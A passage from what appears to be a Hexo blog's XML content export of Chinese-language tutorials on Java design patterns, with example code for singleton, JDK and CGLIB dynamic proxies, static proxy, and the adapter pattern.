SingletonClass.INSTANCE;</span><br><span class="line">		SingletonClass b = SingletonClass.INSTANCE;</span><br><span class="line">		System.out.println(a==b);</span><br><span class="line">		a.f();</span><br><span class="line">		</span><br><span class="line">		SingletonClass.INSTANCE.f();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
  </entry>
  <entry>
    <title>动态代理</title>
    <url>/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/dc7fb504.html</url>
    <content><![CDATA[<h2 id="动态代理模式详解"><a href="#动态代理模式详解" class="headerlink" title="动态代理模式详解"></a>动态代理模式详解</h2><h3 id="JDK实现动态代理模式"><a href="#JDK实现动态代理模式" class="headerlink" title="JDK实现动态代理模式"></a>JDK实现动态代理模式</h3><p>service接口代码实现:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ISomeServcie</span> </span>&#123;</span><br><span class="line">	<span class="function">String <span class="title">doFirst</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">doSecond</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>services实现类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SomeServiceImpl</span> <span class="keyword">implements</span> <span class="title">ISomeServcie</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//目标方法</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">doFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"执行doFirst()方法"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"abcde"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSecond</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"执行doSecond()方法"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.service.ISomeServcie;</span><br><span class="line"><span class="keyword">import</span> com.learn.service.SomeServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] agrs)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> ISomeServcie target = <span class="keyword">new</span> SomeServiceImpl();</span><br><span class="line">		<span class="comment">//使用JDK的Proxy动态代理，要求目标类必须实现接口</span></span><br><span class="line">		<span class="comment">//因为其底层的执行原理，与静态代理的相同</span></span><br><span class="line">		ISomeServcie servcie = (ISomeServcie) Proxy.newProxyInstance(</span><br><span class="line">				<span class="comment">//目标类的类加载器</span></span><br><span class="line">				target.getClass().getClassLoader(),</span><br><span class="line">				<span class="comment">//目标类所实现的所有接口</span></span><br><span class="line">				target.getClass().getInterfaces(),</span><br><span class="line">				<span class="comment">//匿名内部类</span></span><br><span class="line">				<span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">					<span class="comment">//proxy 代理对象本身</span></span><br><span class="line">					<span class="comment">//method 目标方法</span></span><br><span class="line">					<span class="comment">//args 目标方法的参数列表</span></span><br><span class="line">					<span class="meta">@Override</span></span><br><span class="line">					<span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">							<span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">						<span class="comment">//调用目标方法</span></span><br><span class="line">						Object result = method.invoke(target, args);</span><br><span class="line">						<span class="keyword">if</span> (result != <span class="keyword">null</span> &amp;&amp; result != <span class="string">""</span>) &#123;</span><br><span class="line">							result = ((String) result).toUpperCase();</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">return</span> result;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;);</span><br><span class="line"></span><br><span class="line">		String result = servcie.doFirst();</span><br><span class="line">		System.out.println(result);</span><br><span class="line">		servcie.doSecond();</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CGLB动态代理"><a href="#CGLB动态代理" class="headerlink" title="CGLB动态代理"></a>CGLB动态代理</h3><p>需要导入cglib-full.jar，并添加到build path。<br>services类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SomeService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//目标方法</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">doFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"执行doFirst()方法"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"abcde"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSecond</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"执行doSecond()方法"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工厂类(cglb可以增强不包含接口的类):</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.factory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.Enhancer;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodProxy;</span><br><span class="line"><span class="keyword">import</span> com.learn.service.SomeService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyCglbFactory</span> <span class="keyword">implements</span> <span class="title">MethodInterceptor</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> SomeService target;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyCglbFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		target = <span class="keyword">new</span> SomeService();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> SomeService <span class="title">myCglibCreator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">//创建增强器对象</span></span><br><span class="line">		Enhancer enhancer = <span class="keyword">new</span> Enhancer(); </span><br><span class="line">		<span class="comment">//指定目标类，即父类</span></span><br><span class="line">		enhancer.setSuperclass(SomeService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		<span class="comment">//设置回调接口对象</span></span><br><span class="line">		enhancer.setCallback(<span class="keyword">this</span>);</span><br><span class="line">		<span class="keyword">return</span> (SomeService) enhancer.create();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//回调方法</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">intercept</span><span class="params">(Object arg0, Method method, Object[] args,</span></span></span><br><span class="line"><span class="function"><span class="params">			MethodProxy arg3)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">		<span class="comment">//调用目标方法</span></span><br><span class="line">		Object result = method.invoke(target, args);</span><br><span class="line">		<span class="keyword">if</span> (result != <span class="keyword">null</span> &amp;&amp; result != <span class="string">""</span>) &#123;</span><br><span class="line">			result = ((String) result).toUpperCase();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.factory.MyCglbFactory;</span><br><span class="line"><span class="keyword">import</span> com.learn.service.SomeService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] agrs)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		SomeService servcie = <span class="keyword">new</span> MyCglbFactory().myCglibCreator();</span><br><span class="line">		String result = servcie.doFirst();</span><br><span class="line">		System.out.println(result);</span><br><span class="line">		servcie.doSecond();</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>静态代理</title>
    <url>/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/d989c0cb.html</url>
    <content><![CDATA[<h2 id="静态代理模式"><a href="#静态代理模式" class="headerlink" title="静态代理模式"></a>静态代理模式</h2><h3 id="静态代理模式实现"><a href="#静态代理模式实现" class="headerlink" title="静态代理模式实现"></a>静态代理模式实现</h3><p>service接口代码:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ISomeServcie</span> </span>&#123;</span><br><span class="line">	<span class="function">String <span class="title">doFirst</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">doSecond</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>service实现类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SomeServiceImpl</span> <span class="keyword">implements</span> <span class="title">ISomeServcie</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//目标方法</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">doFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"执行doFirst()方法"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"abcde"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSecond</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"执行doSecond()方法"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态代理类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.service.ISomeServcie;</span><br><span class="line"><span class="keyword">import</span> com.learn.service.SomeServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代理类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SomeServiceProxy</span> <span class="keyword">implements</span> <span class="title">ISomeServcie</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> ISomeServcie target;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">SomeServiceProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		target = <span class="keyword">new</span> SomeServiceImpl();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">doFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		String result = target.doFirst();</span><br><span class="line">		<span class="keyword">return</span> result.toUpperCase();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSecond</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		target.doSecond();</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.proxy.SomeServiceProxy;</span><br><span class="line"><span class="keyword">import</span> com.learn.service.ISomeServcie;</span><br><span class="line"><span class="keyword">import</span> com.learn.service.SomeServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] agrs)</span> </span>&#123;</span><br><span class="line">		ISomeServcie servcie = <span class="keyword">new</span> SomeServiceProxy();</span><br><span class="line">		String result = servcie.doFirst();</span><br><span class="line">		System.out.println(result);</span><br><span class="line">		servcie.doSecond();</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:在不修改源代码的情况下增强业务实现，实现doFirst()中首字母大写。</p>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>适配器模式</title>
    <url>/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/f5c535ea.html</url>
    <content><![CDATA[<h2 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h2><h3 id="适配器模式概念"><a href="#适配器模式概念" class="headerlink" title="适配器模式概念"></a>适配器模式概念</h3><p>适配器模式的定义是,Convert the interface of a class into another interface clients<br>expect,将某个类的接口转换为客户所需的类型。换句话说，适配器模式解决的问题是，使得原本由于接口不兼容而不<br>能一起工作、不能统一管理的那些类可以在一起工作、可以进行统一管理。</p><p>这样解释适配器的概念还是很抽象。下面以不同工种的工作内容不同，实现统一管理为例来解释适配器设计模式。</p><h3 id="未使用适配器模式举例"><a href="#未使用适配器模式举例" class="headerlink" title="未使用适配器模式举例"></a>未使用适配器模式举例</h3><p>厨师接口,厨师的任务是烹饪</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICooker</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">cook</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>厨师的实现类,全聚德的厨师</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.worker.ICooker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QjdCooker</span> <span class="keyword">implements</span> <span class="title">ICooker</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">cook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"烤制美味烤鸭"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序员接口，程序员的任务是编程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IProgrammer</span> </span>&#123;</span><br><span class="line">	<span class="function">String <span class="title">programmer</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序员的实现类，京东程序员</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.worker.IProgrammer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdProgrammer</span> <span class="keyword">implements</span> <span class="title">IProgrammer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">programmer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"编写高效程序"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.worker.ICooker;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.IProgrammer;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.impl.JdProgrammer;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.impl.QjdCooker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * 未使用适配器</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ICooker qjdCooker = <span class="keyword">new</span> QjdCooker();</span><br><span class="line">		IProgrammer jdProgrammer = <span class="keyword">new</span> JdProgrammer();</span><br><span class="line">		System.out.println(qjdCooker.cook());</span><br><span class="line">		System.out.println(	jdProgrammer.programmer());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用适配器模式举例"><a href="#使用适配器模式举例" class="headerlink" title="使用适配器模式举例"></a>使用适配器模式举例</h3><p>厨师接口,厨师的任务是烹饪</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICooker</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">cook</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>厨师的实现类,全聚德的厨师</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.worker.ICooker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QjdCooker</span> <span class="keyword">implements</span> <span class="title">ICooker</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">cook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"烤制美味烤鸭"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序员接口，程序员的任务是编程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IProgrammer</span> </span>&#123;</span><br><span class="line">	<span class="function">String <span class="title">programmer</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序员的实现类，京东程序员</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.worker.IProgrammer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdProgrammer</span> <span class="keyword">implements</span> <span class="title">IProgrammer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">programmer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"编写高效程序"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>适配器接口:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.adapters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IWorkerAdapter</span> </span>&#123;</span><br><span class="line">	<span class="function">String <span class="title">work</span><span class="params">(Object work)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>适配器实现类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.adapters.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.adapters.IWorkerAdapter;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.ICooker;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.IProgrammer;</span><br><span class="line"><span class="comment">//适配器类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkerAdapterImpl</span> <span class="keyword">implements</span> <span class="title">IWorkerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">work</span><span class="params">(Object work)</span> </span>&#123;</span><br><span class="line">		String workContent = <span class="string">""</span>;</span><br><span class="line">		<span class="comment">//若传来的对象是厨师，则调用其cook()方法</span></span><br><span class="line">		<span class="keyword">if</span>(work <span class="keyword">instanceof</span> ICooker) &#123;</span><br><span class="line">			workContent = 	((ICooker)work).cook();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(work <span class="keyword">instanceof</span> IProgrammer) &#123;</span><br><span class="line">			workContent = ((IProgrammer)work).programmer();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> workContent;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.adapters.IWorkerAdapter;</span><br><span class="line"><span class="keyword">import</span> com.learn.adapters.impl.WorkerAdapterImpl;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.ICooker;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.IProgrammer;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.impl.JdProgrammer;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.impl.QjdCooker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * 使用适配器</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ICooker qjdCooker = <span class="keyword">new</span> QjdCooker();</span><br><span class="line">		IProgrammer jdProgrammer = <span class="keyword">new</span> JdProgrammer();</span><br><span class="line">		Object[] works = &#123;qjdCooker, jdProgrammer&#125;;</span><br><span class="line">		IWorkerAdapter adapter = <span class="keyword">new</span> WorkerAdapterImpl();</span><br><span class="line">		<span class="comment">//循环遍历每个工种对象，让每个工种对象在适配器中逐个进行匹配</span></span><br><span class="line">		<span class="keyword">for</span> (Object worker : works) &#123;</span><br><span class="line">			String workContent = adapter.work(worker);</span><br><span class="line">			System.out.println(workContent);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="适配器模式最终版"><a href="#适配器模式最终版" class="headerlink" title="适配器模式最终版"></a>适配器模式最终版</h3><p>厨师接口,厨师的任务是烹饪</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICooker</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">cook</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>厨师的实现类,全聚德的厨师</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.worker.ICooker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QjdCooker</span> <span class="keyword">implements</span> <span class="title">ICooker</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">cook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"烤制美味烤鸭"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序员接口，程序员的任务是编程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IProgrammer</span> </span>&#123;</span><br><span class="line">	<span class="function">String <span class="title">programmer</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序员的实现类，京东程序员</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.worker.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.worker.IProgrammer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdProgrammer</span> <span class="keyword">implements</span> <span class="title">IProgrammer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">programmer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"编写高效程序"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>适配器接口类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.adapters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IWorkerAdapter</span> </span>&#123;</span><br><span class="line">	<span class="function">String <span class="title">work</span><span class="params">(Object worker)</span></span>;</span><br><span class="line">	<span class="function">Boolean <span class="title">supports</span><span class="params">(Object worker)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>适配器实现类CookerAdapter.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.adapters.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.adapters.IWorkerAdapter;</span><br><span class="line"><span class="keyword">import</span> com.learn.worker.ICooker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CookerAdapter</span> <span class="keyword">implements</span> <span class="title">IWorkerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">work</span><span class="params">(Object worker)</span> 